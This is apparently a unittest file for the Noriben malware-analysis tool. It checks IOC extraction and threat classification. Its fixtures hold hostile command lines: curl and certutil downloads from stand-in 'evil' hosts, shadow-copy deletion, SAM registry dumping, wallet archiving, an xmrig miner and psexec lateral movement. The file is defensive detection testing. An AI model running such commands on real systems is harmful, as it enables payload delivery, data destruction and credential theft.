"""
Unit tests for the v3.1.0 threat classification and IOC enrichment.

Run with:  python -m unittest discover -s tests -v
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import Noriben  # noqa: E402


def _proc(cmdline):
    return '[CreateProcess] mal.exe:1 > {}\t[Child PID: 2]'.format(cmdline)


class EnrichmentTests(unittest.TestCase):
    def test_extracts_url_ip_btc_eth_email(self):
        procs = [_proc('cmd /c curl http://evil.com/p.exe && echo 1.2.3.4'),
                 _proc('send to attacker@evil.com pay bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'),
                 _proc('eth 0x52908400098527886E0F7030069857D2E4169EE7')]
        ind = Noriben.analyze_indicators(procs, [], [], [], [], 'SHA256')
        enriched = ind['enriched']
        self.assertIn('http://evil.com/p.exe', enriched['urls'])
        self.assertIn('1.2.3.4', enriched['ipv4'])
        self.assertTrue(enriched['bitcoin'])
        self.assertIn('0x52908400098527886E0F7030069857D2E4169EE7', enriched['ethereum'])
        self.assertIn('attacker@evil.com', enriched['emails'])

    def test_private_ips_are_filtered(self):
        ind = Noriben.analyze_indicators([_proc('connect 192.168.1.5 and 10.0.0.1 and 8.8.8.8')],
                                         [], [], [], [], 'SHA256')
        self.assertIn('8.8.8.8', ind['enriched']['ipv4'])
        self.assertNotIn('192.168.1.5', ind['enriched']['ipv4'])
        self.assertNotIn('10.0.0.1', ind['enriched']['ipv4'])

    def test_enriched_in_json_iocs(self):
        ind = Noriben.analyze_indicators([_proc('curl http://x.com/a')], [], [], [], [], 'SHA256')
        data = Noriben.build_json_report(ind, [], {'version': 'x'})
        self.assertIn('http://x.com/a', data['iocs']['urls'])
        self.assertEqual(data['enriched_iocs'], ind['enriched'])


class ClassificationTests(unittest.TestCase):
    def _classify(self, procs, files=None, reg=None, renamed_count=0):
        file_lines = files or []
        reg_lines = reg or []
        ind = Noriben.analyze_indicators([_proc(p) for p in procs], file_lines, reg_lines,
                                         [], [], 'SHA256')
        for _ in range(renamed_count):
            ind['files_renamed'].append({'from': 'a', 'to': 'b'})
        tech = Noriben.detect_attack_techniques(ind)
        return Noriben.classify_threat(ind, tech)

    def test_ransomware(self):
        result = self._classify(['vssadmin delete shadows /all /quiet', 'bcdedit /set recoveryenabled no'],
                                renamed_count=15)
        self.assertEqual(result['primary'], 'Ransomware')
        self.assertEqual(result['confidence'], 'High')

    def test_downloader(self):
        files = ['[CreateFile] m.exe:1 > C:\\a\\payload.exe\t[SHA256: {}]'.format('a' * 64)]
        result = self._classify(['certutil -urlcache -split -f http://evil/p.exe p.exe'], files=files)
        self.assertEqual(result['primary'], 'Downloader / Dropper')

    def test_infostealer(self):
        result = self._classify(['reg save hklm\\sam c:\\sam.hiv', 'rar a out.rar C:\\wallet.dat'])
        self.assertEqual(result['primary'], 'Infostealer / Credential Theft')

    def test_cryptominer(self):
        result = self._classify(['xmrig.exe -o stratum+tcp://pool.supportxmr.com:443 --donate-level 1'])
        self.assertEqual(result['primary'], 'Cryptominer')

    def test_worm(self):
        result = self._classify(['psexec \\\\10.0.0.5 -s cmd', 'net view'])
        self.assertEqual(result['primary'], 'Worm / Spreader')

    def test_unknown_when_benign(self):
        result = self._classify(['notepad.exe readme.txt'])
        self.assertEqual(result['primary'], 'Generic / Unknown')
        self.assertEqual(result['categories'], [])

    def test_classification_in_json_and_verdict_section(self):
        ind = Noriben.analyze_indicators([_proc('xmrig -o stratum+tcp://pool:443 --donate-level 1')],
                                         [], [], [], [], 'SHA256')
        tech = Noriben.detect_attack_techniques(ind)
        classification = Noriben.classify_threat(ind, tech)
        data = Noriben.build_json_report(ind, tech, {'version': 'x'}, classification=classification)
        self.assertEqual(data['classification']['primary'], 'Cryptominer')
        blob = '\n'.join(Noriben.format_verdict_section(Noriben.score_sample(ind, tech), classification))
        self.assertIn('LIKELY TYPE: Cryptominer', blob)


if __name__ == '__main__':
    unittest.main()
